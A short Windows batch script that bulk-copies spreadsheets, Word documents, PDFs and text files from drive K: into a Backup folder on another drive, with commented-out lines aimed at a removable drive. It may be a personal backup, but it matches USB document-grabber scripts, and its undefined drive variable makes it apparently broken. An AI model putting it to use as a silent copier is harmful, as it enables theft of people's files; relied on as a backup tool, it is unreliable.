
@echo off
cls
md %drive%\Backup
::copy  "E:\Moves\*.*" "%removablestorage%\Copy_All\" /Z /y /L
::copy "C:\Windows\System32\*.*" "%drive%\Copy_All\" /Z /Y /L
@echo on
:: variables SET 
SET odrive=%odrive:~0,2% 
set Backupcmd=xcopy /s /c /d /e /h /i /r /y 
echo on 
color 0a
%Backupcmd% "K:\*.xlsx" "%drive%\Backup\K\*.xlsx"
%Backupcmd% "K:\*.docx" "%drive%\Backup\K\*.docx"
%Backupcmd% "K:\*.doc" "%drive%\Backup\K\*.*"
%Backupcmd% "K:\*.pdf" "%drive%\Backup\K\*.*"
%Backupcmd% "K:\*.text" "%drive%\Backup\K\*.*"
%Backupcmd% "K:\*.txt" "%drive%\Backup\K\*.*"
exit